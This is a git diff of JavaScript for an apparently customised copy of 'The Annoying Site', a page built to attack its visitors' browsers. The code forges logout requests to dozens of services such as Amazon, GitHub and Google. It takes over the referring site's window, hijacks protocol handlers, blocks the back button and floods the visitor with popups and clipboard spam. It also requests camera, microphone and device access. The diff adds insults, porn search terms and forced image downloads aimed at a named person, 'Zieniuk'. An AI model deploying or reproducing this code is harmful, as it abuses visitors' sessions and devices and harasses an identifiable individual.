@@ -39,7 +39,7 @@ const ART = [
 const SEARCHES = [
   'azjatyckie porno',
   'chińskie porno',
-  'zieniuk cwel',
+  'zieniuk',
   'PingelOUT',
   'PingelOUT'
 ]
@@ -56,7 +56,7 @@ const VIDEOS = [
 
 const FILE_DOWNLOADS = [
   'zieniuk.png',
-  'zieniuk2030.png',
+  'ZIENIUK2030.png',
   'zieniuk2.jpg',
   'zieniuk3.jpg',
   'zieniuk4.jpg',
@@ -80,7 +80,7 @@ const LOGOUT_SITES = {
   'AOL 2': ['GET', 'https://api.screenname.aol.com/auth/logout?state=snslogout&r=' + Math.random()],
   Amazon: ['GET', 'https://www.amazon.com/gp/flex/sign-out.html?action=sign-out'],
   Blogger: ['GET', 'https://www.blogger.com/logout.g'],
-  Delicious: ['GET', 'https://www.delicious.com/logout'], // works!
+  Delicious: ['GET', 'https://www.delicious.com/logout'], 
   DeviantART: ['POST', 'https://www.deviantart.com/users/logout'],
   DreamHost: ['GET', 'https://panel.dreamhost.com/index.cgi?Nscmd=Nlogout'],
   Dropbox: ['GET', 'https://www.dropbox.com/logout'],
@@ -88,7 +88,7 @@ const LOGOUT_SITES = {
   Gandi: ['GET', 'https://www.gandi.net/login/out'],
   GitHub: ['GET', 'https://github.com/logout'],
   GMail: ['GET', 'https://mail.google.com/mail/?logout'],
-  Google: ['GET', 'https://www.google.com/accounts/Logout'], // works!
+  Google: ['GET', 'https://www.google.com/accounts/Logout'], 
   Hulu: ['GET', 'https://secure.hulu.com/logout'],
   Instapaper: ['GET', 'https://www.instapaper.com/user/logout'],
   Linode: ['GET', 'https://manager.linode.com/session/logout'],
@@ -115,65 +115,31 @@ const LOGOUT_SITES = {
   YouTube: ['POST', 'https://www.youtube.com', { action_logout: '1' }]
 }
 
-/**
- * Array to store the child windows spawned by this window.
- */
 const wins = []
 
-/**
- * Count of number of clicks
- */
 let interactionCount = 0
 
-/**
- * Number of iframes injected into the page for the "super logout" functionality.
- * See superLogout().
- */
 let numSuperLogoutIframes = 0
 
-/**
- * Is this window a child window? A window is a child window if there exists a
- * parent window (i.e. the window was opened by another window so `window.opener`
- * is set) *AND* that parent is a window on the same origin (i.e. the window was
- * opened by us, not an external website)
- */
 const isChildWindow = (window.opener && isParentSameOrigin()) ||
   window.location.search.indexOf('child=true') !== -1
 
-/**
- * Is this window a parent window?
- */
 const isParentWindow = !isChildWindow
 
-/*
- * Run this code in all windows, *both* child and parent windows.
- */
 init()
 
-/*
- * Use `window.opener` to detect if this window was opened by another window, which
- * will be its parent. The `window.opener` variable is a reference to the parent
- * window.
- */
 if (isChildWindow) initChildWindow()
 else initParentWindow()
 
-/**
- * Initialization code for *both* parent and child windows.
- */
 function init () {
   confirmPageUnload()
 
   interceptUserInput(event => {
     interactionCount += 1
 
-    // Prevent default behavior (breaks closing window shortcuts)
     event.preventDefault()
     event.stopPropagation()
 
-    // 'touchstart' and 'touchend' events are not able to open a new window
-    // (at least in Chrome), so don't even try. Checking `event.which !== 0` is just
-    // a clever way to exclude touch events.
     if (event.which !== 0) openWindow()
 
     startVibrateInterval()
@@ -183,10 +149,7 @@ function init () {
     focusWindows()
     copySpamToClipboard()
     speak()
-    startTheramin()
 
-    // Capture key presses on the Command or Control keys, to interfere with the
-    // "Close Window" shortcut.
     if (event.key === 'Meta' || event.key === 'Control') {
       window.print()
       requestWebauthnAttestation()
@@ -206,17 +169,12 @@ function init () {
       requestHidAccess()
       requestCameraAndMic()
       if (Math.random() < 0.1) {
-        // Don't request TouchID on every interaction in Safari since it blocks
-        // the event loop and stops windows from moving
         requestWebauthnAttestation()
       }
     }
   })
 }
 
-/**
- * Initialization code for child windows.
- */
 function initChildWindow () {
   registerProtocolHandlers()
   hideCursor()
@@ -236,9 +194,6 @@ function initChildWindow () {
   })
 }
 
-/**
- * Initialization code for parent windows.
- */
 function initParentWindow () {
   showHelloMessage()
   blockBackButton()
@@ -246,7 +201,6 @@ function initParentWindow () {
   startInvisiblePictureInPictureVideo()
 
   interceptUserInput(event => {
-    // Only run these on the first interaction
     if (interactionCount === 1) {
       registerProtocolHandlers()
       attemptToTakeoverReferrerWindow()
@@ -262,38 +216,20 @@ function initParentWindow () {
   })
 }
 
-/**
- * Sites that link to theannoyingsite.com may specify `target='_blank'` to open the
- * link in a new window. For example, Messenger.com from Facebook does this.
- * However, that means that `window.opener` will be set, which allows us to redirect
- * that window. YES, WE CAN REDIRECT THE SITE THAT LINKED TO US.
- * Learn more here: https://www.jitbit.com/alexblog/256-targetblank---the-most-underestimated-vulnerability-ever/
- */
 function attemptToTakeoverReferrerWindow () {
   if (isParentWindow && window.opener && !isParentSameOrigin()) {
     window.opener.location = `${window.location.origin}/?child=true`
   }
 }
 
-/**
- * Returns true if the parent window is on the same origin. It's not enough to check
- * that `window.opener` is set, because that will also get set if a site on a
- * different origin links to theannoyingsite.com with `target='_blank'`.
- */
 function isParentSameOrigin () {
   try {
-    // May throw an exception if `window.opener` is on another origin
     return window.opener.location.origin === window.location.origin
   } catch (err) {
     return false
   }
 }
 
-/**
- * Ask the user "are you sure you want to leave this page?". In most browsers,
- * this will not actually do anything unless the user has at least one interaction
- * with the page before they close it.
- */
 function confirmPageUnload () {
   window.addEventListener('beforeunload', event => {
     speak('Jebać Zieniuka!')
@@ -301,10 +237,6 @@ function confirmPageUnload () {
   })
 }
 
-/**
- * Attempt to register all possible browser-whitelisted protocols to be handled by
- * this web app instead of their default handlers.
- */
 function registerProtocolHandlers () {
   if (typeof navigator.registerProtocolHandler !== 'function') return
 
@@ -337,11 +269,6 @@ function registerProtocolHandlers () {
     navigator.registerProtocolHandler(proto, handlerUrl, 'The Annoying Site')
   })
 }
-
-/**
- * Attempt to access the user's camera and microphone, and attempt to enable the
- * torch (i.e. camera flash) if the device has one.
- */
 function requestCameraAndMic () {
   if (!navigator.mediaDevices ||
       typeof navigator.mediaDevices.getUserMedia !== 'function') {
@@ -370,14 +297,8 @@ function requestCameraAndMic () {
     }, () => { /* ignore errors */ })
   })
 }
-
-/**
- * Animating the URL with emojis
- * See: https://matthewrayfield.com/articles/animating-urls-with-javascript-and-emojis/
- */
 function animateUrlWithEmojis () {
   if (window.ApplePaySession) {
-    // Safari doesn't show the full URL anyway, so we can't animate it
     return
   }
   const rand = Math.random()
@@ -459,10 +380,6 @@ function animateUrlWithEmojis () {
   }
 }
 
-/**
- * Lock the user's pointer, without even being in full screen!
- * Require user-initiated event.
- */
 function requestPointerLock () {
   const requestPointerLockApi = (
     document.body.requestPointerLock ||
@@ -474,10 +391,6 @@ function requestPointerLock () {
   requestPointerLockApi.call(document.body)
 }
 
-/**
- * Start vibrating the device at random intervals, on supported devices.
- * Requires user-initiated event.
- */
 function startVibrateInterval () {
   if (typeof window.navigator.vibrate !== 'function') return
   setInterval(() => {
@@ -485,7 +398,6 @@ function startVibrateInterval () {
     window.navigator.vibrate(duration)
   }, 1000)
 
-  // If the gamepad can vibrate, we will at random intervals every second. And at random strengths!
   window.addEventListener('gamepadconnected', (event) => {
     const gamepad = event.gamepad
     if (gamepad.vibrationActuator) {
@@ -502,9 +414,6 @@ function startVibrateInterval () {
   })
 }
 
-/**
- * Intercept all user-initiated events and call the given the function, `onInput`.
- */
 function interceptUserInput (onInput) {
   document.body.addEventListener('touchstart', onInput, { passive: false })
 
@@ -517,10 +426,6 @@ function interceptUserInput (onInput) {
   document.body.addEventListener('keypress', onInput)
 }
 
-/**
- * Start an invisible, muted video so we have a one ready to put into
- * picture-in-picture mode on the first user-interaction.
- */
 function startInvisiblePictureInPictureVideo () {
   const video = document.createElement('video')
   video.src = getRandomArrayEntry(VIDEOS)
@@ -533,10 +438,6 @@ function startInvisiblePictureInPictureVideo () {
   document.body.appendChild(video)
 }
 
-/**
- * Active Safari's picture-in-picture feature, which let's show a video on the
- * desktop. Requires user-initiated event.
- */
 function enablePictureInPicture () {
   const video = document.querySelector('video')
   if (document.pictureInPictureEnabled) {
@@ -547,42 +448,27 @@ function enablePictureInPicture () {
   }
 }
 
-/**
- * Focus all child windows. Requires user-initiated event.
- */
 function focusWindows () {
   wins.forEach(win => {
     if (!win.closed) win.focus()
   })
 }
 
-/**
- * Open a new popup window. Requires user-initiated event.
- */
 function openWindow () {
   const { x, y } = getRandomCoords()
   const opts = `width=${WIN_WIDTH},height=${WIN_HEIGHT},left=${x},top=${y}`
   const win = window.open(window.location.pathname, '', opts)
 
-  // New windows may be blocked by the popup blocker
   if (!win) return
   wins.push(win)
 
   if (wins.length === 2) setupSearchWindow(win)
 }
 
-/**
- * Hide the user's cursor!
- */
 function hideCursor () {
   document.querySelector('html').style = 'cursor: none;'
 }
 
-/**
- * Trigger a file download immediately. One file download is allowed *without* user
- * interaction. Further file downloads should happen in response to a user-initiated
- * event or they will be blocked.
- */
 function triggerFileDownload () {
   const fileName = getRandomArrayEntry(FILE_DOWNLOADS)
   const a = document.createElement('a')
